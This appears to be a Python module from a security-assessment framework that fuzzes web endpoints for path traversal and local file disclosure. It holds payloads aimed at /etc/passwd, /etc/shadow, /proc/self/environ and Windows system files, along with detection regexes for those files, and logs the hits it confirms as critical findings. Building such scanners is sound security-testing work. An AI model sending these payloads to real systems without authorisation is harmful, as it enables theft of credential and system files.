"""
Path & Directory Traversal Collector.

Actively fuzzes discovered endpoint parameters and URL paths for directory escape
and arbitrary file read vulnerabilities using AuthenticatedHttpClient.
Emits high-confidence Evidence(category="path_traversal", severity="critical"),
updates mission state, and connects attack surface graph nodes with HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import logging
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)

# Target OS File Content Signatures
UNIX_PASSWD_REGEX = re.compile(
    r"root:[x*]:0:0:.*?:(?:/root|/bin/(?:bash|sh|zsh|dash|nologin))",
    re.MULTILINE,
)
UNIX_PASSWD_FALLBACK_REGEX = re.compile(
    r"\broot:[x*]?:0:0:[^:\n]*:[^:\n]*:(?:/[^\s:\n]+)\b"
)
UNIX_PASSWD_MULTI_REGEX = re.compile(
    r"(?:root:[x*]?:0:0:[^:\n]*:[^:\n]*:(?:/[^\s:\n]+)|daemon:[x*]?:[0-9]+:[0-9]+:[^:\n]*:[^:\n]*:(?:/[^\s:\n]+)|bin:[x*]?:[0-9]+:[0-9]+:[^:\n]*:[^:\n]*:(?:/[^\s:\n]+)|nobody:[x*]?:[0-9]+:[0-9]+:[^:\n]*:[^:\n]*:(?:/[^\s:\n]+))"
)
UNIX_SHADOW_REGEX = re.compile(
    r"(?m)^root:(?:\$[0-9a-zA-Z$=_./-]+|!|\*):[0-9]*:[0-9]*:[0-9]*:[0-9]*:"
)
UNIX_ENVIRON_REGEX = re.compile(
    r"\b(?:PATH=|SHELL=|USER=|HOME=|PWD=|LANG=|HOSTNAME=)[^\x00\n\r]{2,}"
)
UNIX_HOSTS_REGEX = re.compile(r"(?m)^127\.0\.0\.1\s+localhost")
UNIX_VERSION_REGEX = re.compile(r"Linux version \d+\.\d+[\w\.-]+ \([^\)]+\)")

WINDOWS_INI_REGEX = re.compile(
    r"\[(?:fonts|extensions|mci extensions|files|mail|386enh|drivers)\]",
    re.IGNORECASE,
)
WINDOWS_BOOT_REGEX = re.compile(
    r"\[(?:boot loader|operating systems)\]",
    re.IGNORECASE,
)
WINDOWS_WIN_INI_COMMENT_REGEX = re.compile(
    r"(?i)(?:for 16-bit app support|bit app support)"
)
WINDOWS_HOSTS_REGEX = re.compile(
    r"(?i)#\s*Copyright\s*\(c\)\s*1993-\d{4}\s*Microsoft\s*Corp\."
)

DEFAULT_TRAVERSAL_PAYLOADS: List[str] = [
    # Unix Standard Relative
    "../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    # Unix Nested Evasion
    "....//....//....//....//etc/passwd",
    "....//....//....//....//....//....//....//....//etc/passwd",
    # Unix URL Encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    # Unix Double URL Encoded
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
    # Unix Overlong UTF-8
    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%2fpasswd",
    # Unix Absolute Paths
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    # Unix Null Byte Bypasses
    "/etc/passwd%00",
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    "../../../../etc/passwd%00.png",
    # Unix Path Parameter Bypass
    "..;/..;/..;/..;/etc/passwd",
    # Windows Standard & Backslash
    "c:\\windows\\win.ini",
    "c:/windows/win.ini",
    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../../../windows/win.ini",
    "../../../../windows/win.ini",
    "c:\\boot.ini",
    "c:/boot.ini",
    "../../../../boot.ini",
    "../../../../../../../../boot.ini",
    # Windows Null Byte Bypasses
    "c:/windows/win.ini%00.png",
    "../../../../windows/win.ini%00.jpg",
    "c:\\boot.ini%00.txt",
]

COMMON_FILE_PARAMS: Set[str] = {
    "file", "path", "filename", "doc", "document", "page", "view", "url",
    "dir", "folder", "include", "template", "layout", "load", "read",
    "image", "img", "src", "source", "download", "target", "item", "name",
    "cat", "resource", "content", "file_name", "file_path", "page_name",
}

DEFAULT_PROBE_ROUTES: List[str] = [
    "/download",
    "/file",
    "/view",
    "/read",
    "/image",
    "/static",
    "/doc",
    "/get",
    "/include",
]


class PathTraversalPayloadGenerator:
    """
    Generates payloads and variations for directory traversal and LFI fuzzing.
    """

    def __init__(self, custom_payloads: Optional[List[str]] = None):
        self.custom_payloads = list(custom_payloads) if custom_payloads is not None else None

    def get_payloads(self) -> List[str]:
        if self.custom_payloads is not None:
            return list(self.custom_payloads)
        return list(DEFAULT_TRAVERSAL_PAYLOADS)


class PathTraversalAnalyzer:
    """
    Inspects HTTP responses for genuine OS file leak signatures
    while eliminating reflections, soft 404s, and false positives.
    """

    SIGNATURES: List[Tuple[str, re.Pattern, str, str]] = [
        # (Signature Name, Regex, Target File, OS)
        ("linux_shadow_root", UNIX_SHADOW_REGEX, "/etc/shadow", "linux"),
        ("linux_passwd_root", UNIX_PASSWD_REGEX, "/etc/passwd", "linux"),
        ("linux_passwd_fallback", UNIX_PASSWD_FALLBACK_REGEX, "/etc/passwd", "linux"),
        ("linux_passwd_multi", UNIX_PASSWD_MULTI_REGEX, "/etc/passwd", "linux"),
        ("linux_environ", UNIX_ENVIRON_REGEX, "/proc/self/environ", "linux"),
        ("linux_hosts", UNIX_HOSTS_REGEX, "/etc/hosts", "linux"),
        ("linux_version", UNIX_VERSION_REGEX, "/proc/version", "linux"),
        ("windows_win_ini", WINDOWS_INI_REGEX, "c:\\windows\\win.ini", "windows"),
        ("windows_win_ini_comment", WINDOWS_WIN_INI_COMMENT_REGEX, "c:\\windows\\win.ini", "windows"),
        ("windows_boot_ini", WINDOWS_BOOT_REGEX, "c:\\boot.ini", "windows"),
        ("windows_hosts", WINDOWS_HOSTS_REGEX, "c:\\windows\\system32\\drivers\\etc\\hosts", "windows"),
    ]

    def analyze(
        self,
        status_code: Optional[int],
        body: Optional[str],
        payload: str,
        baseline_body: Optional[str] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Evaluates response body against OS signatures.
        Returns match metadata dictionary if confirmed, else None.
        """
        # Reject non-2xx status codes
        if status_code is None or status_code < 200 or status_code >= 300:
            return None

        if not body or len(body.strip()) < 10:
            return None

        body_str = str(body)

        # Baseline differential check: if baseline already had the signature, ignore
        if baseline_body and len(baseline_body) > 10:
            for sig_name, pattern, _, _ in self.SIGNATURES:
                if pattern.search(body_str) and pattern.search(baseline_body):
                    return None

        for sig_name, pattern, target_file, os_type in self.SIGNATURES:
            match = pattern.search(body_str)
            if not match:
                continue

            matched_text = match.group(0)

            # Reflection Guard:
            # If the matched text is simply an exact echo of the injected payload string,
            # or part of an error page echoing the payload, discard as reflection.
            clean_payload = payload.strip()
            if clean_payload and clean_payload in body_str:
                # If matched text is a substring of the payload itself, it's a reflection
                if matched_text in clean_payload and matched_text not in ("root:x:0:0:", "[extensions]", "[fonts]", "[boot loader]"):
                    continue

                # If response looks like a generic HTML echo without OS file structure:
                if "<html" in body_str.lower() and "file not found" in body_str.lower():
                    # For unix passwd, must have multi-line or colon-delimited structure
                    if os_type == "linux" and not UNIX_PASSWD_REGEX.search(body_str) and not UNIX_PASSWD_MULTI_REGEX.search(body_str) and not UNIX_SHADOW_REGEX.search(body_str):
                        continue

            snippet = matched_text
            # Expand snippet context slightly if possible
            start_pos = max(0, match.start() - 20)
            end_pos = min(len(body_str), match.end() + 100)
            expanded_snippet = body_str[start_pos:end_pos].strip()

            clean_slug = target_file.strip("/\\").replace("/", "-").replace("\\", "-").replace(":", "-").replace(".", "-")
            template_id = f"path-traversal-{clean_slug}"

            return {
                "matched_signature": sig_name,
                "target_file": target_file,
                "os": os_type,
                "snippet": expanded_snippet,
                "matched_text": matched_text,
                "template_id": template_id,
            }

        return None


class PathTraversalCollector(BaseCollector):
    """
    Actively fuzzes endpoint parameters and paths for directory escape
    and arbitrary file disclosure vulnerabilities using AuthenticatedHttpClient.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        payloads: Optional[List[str]] = None,
        timeout: float = 5.0,
        analyzer: Optional[PathTraversalAnalyzer] = None,
    ):
        self.http_client = http_client
        self.generator = PathTraversalPayloadGenerator(custom_payloads=payloads)
        self.timeout = timeout
        self.analyzer = analyzer or PathTraversalAnalyzer()

    def _normalize_base_url(self, raw_url: str) -> str:
        raw_clean = str(raw_url).strip()
        if not raw_clean.startswith("http://") and not raw_clean.startswith("https://"):
            raw_clean = f"https://{raw_clean}"
        parsed = urllib.parse.urlparse(raw_clean)
        scheme = parsed.scheme or "https"
        netloc = parsed.netloc or parsed.path.split("/")[0]
        return f"{scheme}://{netloc}"

    def _extract_candidate_endpoints(self, mission: Any) -> List[Dict[str, Any]]:
        """
        Extracts structured candidate endpoints and baseline targets from mission.
        """
        candidates: List[Dict[str, Any]] = []
        seen_urls: Set[str] = set()

        # Extract base hosts
        base_hosts: List[str] = []
        for h in getattr(mission, "live_hosts", []) or []:
            if isinstance(h, dict):
                url = h.get("url") or h.get("host")
                if url:
                    base_hosts.append(self._normalize_base_url(url))
            elif isinstance(h, str) and h:
                base_hosts.append(self._normalize_base_url(h))

        target_str = getattr(mission, "target", None)
        if target_str:
            base_hosts.append(self._normalize_base_url(str(target_str)))

        base_hosts = list(dict.fromkeys(base_hosts))
        default_base = base_hosts[0] if base_hosts else "https://target.local"

        # Ingest explicit endpoints
        for ep in getattr(mission, "endpoints", []) or []:
            raw_url = ""
            if isinstance(ep, dict):
                raw_url = ep.get("url") or ep.get("path") or ""
            elif isinstance(ep, str):
                raw_url = ep

            if not raw_url:
                continue

            # Complete relative URLs
            if not raw_url.startswith("http://") and not raw_url.startswith("https://"):
                full_url = urllib.parse.urljoin(default_base.rstrip("/") + "/", raw_url.lstrip("/"))
            else:
                full_url = raw_url

            if full_url not in seen_urls:
                seen_urls.add(full_url)
                parsed = urllib.parse.urlparse(full_url)
                base_url = f"{parsed.scheme}://{parsed.netloc}"
                candidates.append({
                    "url": full_url,
                    "base_url": base_url,
                    "path": parsed.path or "/",
                    "query": parsed.query,
                    "source": "mission.endpoints",
                })

        # Fallback / Proactive standard probe routes on candidate base hosts
        for base_url in (base_hosts or [default_base]):
            for probe_path in DEFAULT_PROBE_ROUTES:
                # Query param variations on probe path
                for param in ("file", "path", "doc", "view", "page", "read", "name"):
                    probe_url = f"{base_url.rstrip('/')}{probe_path}?{param}=default"
                    if probe_url not in seen_urls:
                        seen_urls.add(probe_url)
                        parsed = urllib.parse.urlparse(probe_url)
                        candidates.append({
                            "url": probe_url,
                            "base_url": base_url,
                            "path": parsed.path,
                            "query": parsed.query,
                            "source": "default_probe",
                        })

                # Path-based probe template
                path_probe_url = f"{base_url.rstrip('/')}{probe_path}"
                if path_probe_url not in seen_urls:
                    seen_urls.add(path_probe_url)
                    parsed = urllib.parse.urlparse(path_probe_url)
                    candidates.append({
                        "url": path_probe_url,
                        "base_url": base_url,
                        "path": parsed.path,
                        "query": "",
                        "source": "path_probe",
                    })

        return candidates

    def _execute_request(self, mission: Any, url: str) -> Optional[HttpResponse]:
        """
        Sends an HTTP GET request using injected or standard AuthenticatedHttpClient.
        """
        try:
            if self.http_client is not None:
                if hasattr(self.http_client, "get"):
                    try:
                        return self.http_client.get(mission, url, timeout=self.timeout)
                    except TypeError:
                        return self.http_client.get(url, timeout=self.timeout)
                elif callable(self.http_client):
                    return self.http_client(url)
                return None

            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=1) as client:
                return client.get(mission, url, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"PathTraversalCollector request failed for {url}: {e}")
            return None

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes active path & directory traversal fuzzing across candidate endpoints.
        """
        candidates = self._extract_candidate_endpoints(mission)
        payloads = self.generator.get_payloads()

        if not candidates:
            logger.info("PathTraversalCollector: No candidate endpoints or hosts to fuzz.")
            return []

        logger.info(
            f"PathTraversalCollector: Fuzzing {len(candidates)} candidate endpoint(s) with {len(payloads)} payload(s)..."
        )

        detected_evidence: List[Evidence] = []
        confirmed_vuln_keys: Set[str] = set()

        for candidate in candidates:
            orig_url = candidate["url"]
            base_url = candidate["base_url"]
            parsed_url = urllib.parse.urlparse(orig_url)
            query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)

            # 1. Query Parameter Fuzzing
            if query_params:
                for param_name in list(query_params.keys()):
                    for payload in payloads:
                        mutated_params = dict(query_params)
                        mutated_params[param_name] = [payload]
                        new_query = urllib.parse.urlencode(mutated_params, doseq=True)
                        target_url = urllib.parse.urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            new_query,
                            parsed_url.fragment,
                        ))

                        resp = self._execute_request(mission, target_url)
                        if not resp:
                            continue

                        status_code = getattr(resp, "status_code", None)
                        if status_code is None and hasattr(resp, "status"):
                            status_code = getattr(resp, "status")

                        raw_body = (
                            getattr(resp, "raw_body", None)
                            or getattr(resp, "body", None)
                            or getattr(resp, "text", "")
                            or ""
                        )

                        analysis = self.analyzer.analyze(
                            status_code=status_code,
                            body=raw_body,
                            payload=payload,
                        )

                        if analysis:
                            vuln_key = f"{parsed_url.path}:{param_name}:{analysis['target_file']}"
                            if vuln_key not in confirmed_vuln_keys:
                                confirmed_vuln_keys.add(vuln_key)
                                ev = self._create_evidence_and_update_state(
                                    mission=mission,
                                    target_url=target_url,
                                    base_url=base_url,
                                    param=param_name,
                                    param_type="query",
                                    payload=payload,
                                    status_code=status_code or 200,
                                    analysis=analysis,
                                )
                                detected_evidence.append(ev)
                                # Break payload loop on first confirmed vulnerability for this parameter
                                break

            # 2. Path Segment Fuzzing (e.g. /download/{payload})
            else:
                for payload in payloads:
                    clean_path = parsed_url.path.rstrip("/")
                    target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{clean_path}/{payload.lstrip('/')}"

                    resp = self._execute_request(mission, target_url)
                    if not resp:
                        continue

                    status_code = getattr(resp, "status_code", None)
                    if status_code is None and hasattr(resp, "status"):
                        status_code = getattr(resp, "status")

                    raw_body = (
                        getattr(resp, "raw_body", None)
                        or getattr(resp, "body", None)
                        or getattr(resp, "text", "")
                        or ""
                    )

                    analysis = self.analyzer.analyze(
                        status_code=status_code,
                        body=raw_body,
                        payload=payload,
                    )

                    if analysis:
                        vuln_key = f"{clean_path}:path_segment:{analysis['target_file']}"
                        if vuln_key not in confirmed_vuln_keys:
                            confirmed_vuln_keys.add(vuln_key)
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=target_url,
                                base_url=base_url,
                                param="path",
                                param_type="path",
                                payload=payload,
                                status_code=status_code or 200,
                                analysis=analysis,
                            )
                            detected_evidence.append(ev)
                            break

        logger.info(
            f"PathTraversalCollector complete: {len(detected_evidence)} path traversal vulnerability(ies) identified."
        )
        return detected_evidence

    def _create_evidence_and_update_state(
        self,
        mission: Any,
        target_url: str,
        base_url: str,
        param: str,
        param_type: str,
        payload: str,
        status_code: int,
        analysis: Dict[str, Any],
    ) -> Evidence:
        """
        Constructs Evidence, appends to mission evidence and vulnerabilities, and updates attack surface graph.
        """
        template_id = analysis["template_id"]
        target_file = analysis["target_file"]
        signature_name = analysis["matched_signature"]
        snippet = analysis["snippet"]
        target_os = analysis["os"]

        parsed_url = urllib.parse.urlparse(target_url)
        url_path = parsed_url.path or "/"

        title = f"Path Traversal: {param} on {target_url}"
        description = (
            f"Path & Directory Traversal vulnerability confirmed on endpoint {target_url} "
            f"via parameter '{param}'. Successfully disclosed arbitrary system file '{target_file}' "
            f"(matched signature: {signature_name})."
        )

        ev = Evidence(
            mission_id=getattr(mission, "id", ""),
            source_type="LOG",
            created_by="SYSTEM_GENERATED",
            title=title,
            description=description,
            category="path_traversal",
            value=target_url,
            source=target_url,
            status="CONFIRMED",
            confidence=0.95,
            severity="critical",
            provenance=ProvenanceData(
                step_id="path_traversal_collector",
            ),
            tags=["path_traversal", "lfi", "file_disclosure", template_id],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "category": "path_traversal",
                "severity": "critical",
                "template_id": template_id,
                "target_file": target_file,
                "matched_signature": signature_name,
                "os": target_os,
                "status_code": status_code,
                "evidence_snippet": snippet[:250],
            },
        )

        # 1. Add to mission.evidence
        if hasattr(mission, "evidence") and mission.evidence is not None:
            if hasattr(mission.evidence, "add"):
                mission.evidence.add(ev)
            elif isinstance(mission.evidence, list):
                mission.evidence.append(ev)

        # 2. Add to mission.vulnerabilities
        if hasattr(mission, "vulnerabilities") and isinstance(mission.vulnerabilities, list):
            mission.vulnerabilities.append({
                "name": f"Path Traversal ({target_file})",
                "template_id": template_id,
                "severity": "critical",
                "host": base_url,
                "url": target_url,
                "description": description,
                "parameter": param,
                "payload": payload,
                "matched_signature": signature_name,
            })

        # 3. KnowledgeGraph Node & Edge Expansion
        graph = getattr(mission, "attack_surface_graph", None) or getattr(mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{template_id}:{target_url}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=f"Path Traversal ({target_file})", metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        return ev

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin/Specialist adapter interface."""
        return self.collect(mission)
